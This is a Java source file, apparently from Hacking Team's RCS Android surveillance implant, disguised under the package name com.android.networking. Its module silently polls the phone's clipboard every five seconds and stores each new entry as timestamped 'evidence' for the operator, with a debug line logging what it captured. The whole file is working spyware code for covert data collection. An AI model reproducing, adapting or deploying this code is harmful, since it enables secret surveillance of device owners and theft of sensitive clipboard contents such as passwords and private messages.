/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.util.ArrayList;

import android.content.Context;
import android.text.ClipboardManager;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;

import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.LogR;
import com.android.networking.interfaces.IncrementalLog;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;
import com.android.networking.util.WChar;

public class ModuleClipboard extends BaseModule implements IncrementalLog {

	private static final String TAG = "ModuleClipboard"; //$NON-NLS-1$

	ClipboardManager clipboardManager;
	static String lastClip = ""; //$NON-NLS-1$

	LogR logIncremental;

	@Override
	public void actualStart() {
		logIncremental = new LogR(EvidenceType.CLIPBOARD);
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		if (Cfg.DEBUG) {
			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
		}
	}

	@Override
	public void actualStop() {
		clipboardManager = null;
		logIncremental.close();
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(5000);
		return true;
	}

	@Override
	public void actualGo() {

		final String ret = clipboardManager.getText().toString();
		if (ret != null && !ret.equals(lastClip)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
			}
			saveEvidence(ret);
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {

		final byte[] tm = (new DateTime()).getStructTm();
		final byte[] payload = WChar.getBytes(ret.toString(), true);
		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(process);
		items.add(window);
		items.add(payload);
		items.add(ByteArray.intToByteArray(LogR.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
		}
		synchronized (this) {
			logIncremental.write(items);
		}

	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}
		if (logIncremental.hasData()) {
			logIncremental.close();
			logIncremental = new LogR(EvidenceType.CLIPBOARD);
		}
	}

}
